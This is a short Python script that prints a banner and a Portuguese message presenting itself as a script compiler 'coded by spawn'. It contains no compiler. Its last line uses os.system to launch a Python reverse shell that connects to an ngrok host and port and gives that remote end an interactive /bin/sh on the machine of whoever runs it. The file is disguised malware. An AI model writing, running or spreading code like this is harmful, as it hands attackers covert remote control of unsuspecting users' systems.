import os

print(f''' 
                           _ _       _             
                          (_) |     | |            
  ___ ___  _ __ ___  _ __  _| | __ _| |_ ___  _ __ 
 / __/ _ \| '_ ` _ \| '_ \| | |/ _` | __/ _ \| '__|
| (_| (_) | | | | | | |_) | | | (_| | || (_) | |   
 \___\___/|_| |_| |_| .__/|_|_|\__,_|\__\___/|_|   
                    | |                            
                    |_|                   
coded by spawn
''')

print(f'''isso e um compilador para scripts


$ comece agora seu script:  
''')

os.system('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",16616));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''')